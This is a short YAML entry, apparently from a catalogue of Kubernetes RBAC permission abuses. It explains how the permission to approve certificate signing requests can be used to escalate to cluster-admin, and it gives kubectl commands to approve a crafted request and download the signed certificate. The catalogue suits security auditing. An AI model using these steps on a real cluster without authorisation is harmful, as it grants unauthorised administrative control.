---
verb: "update"
resource: "certificatesigningrequests/approval"
apiGroup: "certificates.k8s.io"
description: "Approve certificatesigningrequests"
abuses:
  - type: "Privilege Escalation"
    description: "1. You need the 'create certificatesigingrequests' permission (default for Nodes) to create a certificatesigningrequest with cluster admin privileges. 
    2. Approve the certificatesigningrequest
    (3. You may not be authorized to approve requests for that signer. In that case you need 'approve signers' in order to change that.)"
    code: |
      # Approve certificate
      kubectl certificate approve admin-client

      # Download certificate
      kubectl get csr admin-client -o jsonpath='{.status.certificate}' | base64 --decode > admin-client.crt
---